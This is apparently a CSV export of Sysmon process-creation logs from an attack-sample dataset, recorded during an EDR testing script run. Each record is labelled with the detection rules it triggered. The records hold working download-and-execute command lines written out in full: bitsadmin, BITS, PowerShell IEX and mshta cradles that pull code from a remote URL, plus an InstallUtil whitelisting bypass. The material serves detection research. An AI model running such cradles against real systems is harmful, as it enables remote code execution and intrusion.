2019-07-29T21:33:03.254713+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;Usage Of Web Request Commands And Cmdlets,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4893,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2948
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660F-5D3F-0000-001055378600
CommandLine: cmd  /c powershell -c ""Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:03.238
"
2019-07-29T21:33:03.886611+00:00,File Download Via Bitsadmin;File Download Via Bitsadmin To A Suspicious Target Folder;File With Suspicious Extension Downloaded Via Bitsadmin;Hacktool - EDR-Freeze Execution;Suspicious Download From File-Sharing Website Via Bitsadmin;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4894,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: cmd  /c bitsadmin.exe /transfer ""JobName"" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt ""C:\Windows\system32\Default_File_Path.ps1""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6020
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-660F-5D3F-0000-00109B328600
ProcessId: 3896
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660F-5D3F-0000-00100F4F8600
CommandLine: bitsadmin.exe  /transfer ""JobName"" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt ""C:\Windows\system32\Default_File_Path.ps1""
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:03.667
"
2019-07-29T21:33:03.966393+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;UAC Bypass Using NTFS Reparse Point - Process;Usage Of Web Request Commands And Cmdlets,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4895,MSEDGEWIN10,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: cmd  /c powershell -c ""Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2948
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: 747F3D96-660F-5D3F-0000-001055378600
ProcessId: 6720
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660F-5D3F-0000-00106B508600
CommandLine: powershell  -c ""Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:03.695
"
2019-07-29T21:33:04.008882+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4896,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3756
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660F-5D3F-0000-00104D5B8600
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:03.875
"
2019-07-29T21:33:08.202018+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4897,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 108
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6614-5D3F-0000-001093CE8600
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:08.174
"
2019-07-29T21:33:08.318896+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4898,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 7156
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6614-5D3F-0000-00104ED38600
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:08.311
"
2019-07-29T21:33:08.446374+00:00,Hacktool - EDR-Freeze Execution;Suspicious Execution of InstallUtil Without Log;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4899,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
RuleName: ''
Description: .NET Framework installation utility
TerminalSessionId: 1
ParentCommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 108
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=1BEB7CDC82F57269A4AD123BE7F8B72F7F1B4630,MD5=7CCB088EEFBF464D0A467D0FF4C619DA,SHA256=0389427DA1D97388D89F28C2D856CD871FC200562C51749C6F6EF4FED9087FAE,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 747F3D96-6614-5D3F-0000-001093CE8600
ProcessId: 5696
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6614-5D3F-0000-0010BFD98600
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe  /logfile= /LogToConsole=false /U AllTheThings.dll
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:08.415
"
2019-07-29T21:33:13.214691+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4900,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5116
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6619-5D3F-0000-0010FDE78600
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:13.169
"
2019-07-29T21:33:13.225412+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4901,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3224
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6619-5D3F-0000-0010BEE98600
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:13.187
"
2019-07-29T21:33:18.286776+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4902,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 776
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-661E-5D3F-0000-0010A3148700
CommandLine: cmd  /c mshta.exe javascript:a=GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct"").Exec();close();
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:18.241
"
2019-07-29T21:33:18.310206+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4903,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6756
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-661E-5D3F-0000-00103F168700
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:18.281
"
2019-07-29T21:33:18.583990+00:00,Hacktool - EDR-Freeze Execution;Remotely Hosted HTA File Executed Via Mshta.EXE;Suspicious JavaScript Execution Via Mshta.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4904,MSEDGEWIN10,"Image: C:\Windows\System32\mshta.exe
RuleName: ''
Description: Microsoft (R) HTML Application host
TerminalSessionId: 1
ParentCommandLine: cmd  /c mshta.exe javascript:a=GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct"").Exec();close();
Product: Internet Explorer
Company: Microsoft Corporation
ParentProcessId: 776
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=DD8B22ACEA424823BB64ABF71F61A03D41177C38,MD5=F328FDCFF05BF02C2C986D52AED8BC2A,SHA256=E616C5CE71886652C13E2E1FA45A653B44D492B054F16B15A38418B8507F57C7,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F
ParentProcessGuid: 747F3D96-661E-5D3F-0000-0010A3148700
ProcessId: 3164
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-661E-5D3F-0000-00107F248700
CommandLine: mshta.exe  javascript:a=GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct"").Exec();close();
FileVersion: 11.00.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:18.451
"
2019-07-29T21:33:20.186248+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4906,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: mshta.exe  javascript:a=GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct"").Exec();close();
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3164
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-661E-5D3F-0000-00107F248700
ProcessId: 404
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6620-5D3F-0000-0010C7798700
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\mshta.exe
UtcTime: 2019-07-29 21:33:20.117
"
2019-07-29T21:33:21.567754+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4909,MSEDGEWIN10,"Image: C:\Windows\System32\svchost.exe
RuleName: ''
Description: Host Process for Windows Services
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 568
LogonGuid: 747F3D96-DCFE-5D3F-0000-0020E5030000
Hashes: SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: 747F3D96-DCFC-5D3F-0000-0010F1520000
ProcessId: 1356
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6621-5D3F-0000-001071D28700
CommandLine: C:\Windows\system32\svchost.exe -k LocalService -p -s BthAvctpSvc
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\LOCAL SERVICE
LogonId: '0x3e5'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-07-29 21:33:21.534
"
2019-07-29T21:33:23.215719+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;PowerShell Download and Execution Cradles;Suspicious PowerShell Invocations - Specific - ProcessCreation;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4910,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5816
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6623-5D3F-0000-001011F68700
CommandLine: cmd  /c powershell -c ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:23.170
"
2019-07-29T21:33:23.232566+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4911,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6156
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6623-5D3F-0000-0010CBF78700
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:23.192
"
2019-07-29T21:33:23.507565+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;Potential Encoded PowerShell Patterns In CommandLine;PowerShell Download Pattern;PowerShell Download and Execution Cradles;Suspicious PowerShell Invocations - Specific - ProcessCreation;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4912,MSEDGEWIN10,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: cmd  /c powershell -c ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5816
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: 747F3D96-6623-5D3F-0000-001011F68700
ProcessId: 3000
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6623-5D3F-0000-0010BC068800
CommandLine: powershell  -c ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:23.380
"
2019-07-29T21:33:24.104732+00:00,Malicious PowerShell Scripts - FileCreation;PowerShell Script Dropped Via PowerShell.EXE,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,11,4913,MSEDGEWIN10,"ProcessGuid: 747F3D96-6623-5D3F-0000-0010BC068800
CreationUtcTime: 2019-07-29 21:33:04.539
UtcTime: 2019-07-29 21:33:24.100
ProcessId: 3000
RuleName: ''
TargetFilename: C:\Windows\System32\Default_File_Path.ps1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
"
2019-07-29T21:33:24.563745+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4914,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: powershell  -c ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3000
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-6623-5D3F-0000-0010BC068800
ProcessId: 1176
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6624-5D3F-0000-0010E8358800
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-29 21:33:24.400
"
2019-07-29T21:33:28.250664+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4916,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
